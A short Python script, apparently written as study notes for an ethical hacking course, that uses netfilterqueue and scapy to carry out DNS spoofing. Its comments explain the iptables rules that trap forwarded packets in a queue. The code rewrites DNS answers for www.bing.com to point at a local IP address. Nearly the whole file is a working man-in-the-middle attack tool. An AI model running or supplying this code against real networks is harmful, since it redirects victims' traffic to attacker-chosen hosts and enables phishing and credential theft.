#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

# iptables -I FORWARD -j NFQUEUE --queue-num 0
"""
It is a command that is used to trap all packets
that go through our computer in a queue.
 iptables - program in Kali Linux to modify network rules
 -I FORWARD - We want to modify exactly this chain (FORWARD)
 -I OUTPUT - If we want to use our local computer 
 to capture packets that living our own computer
 -I INPUT - packets sending to our computer
 -j NFQUEUE  - We put them in a Net Filter Queue
 --queue-num 0 - we specify this queue as 0
 """

# iptables --flush
"""
To delete iptables that we created 
"""


def process_packet(packet):
    # Converting packet into scapy packet
    # get_payload() - to get more info from packet
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        # Choose an appropriate packet and modify it
        if "www.bing.com" in str(qname):
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.211.55.5")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            """
            Deleting fields in packets that contains info about
            old packets to check if they won't be modified. 
            Scapy will automatically recalculate this fields 
            """
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            
            # Convert scapy_packet to string and give whole info in original packet
            packet.set_payload(bytes(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()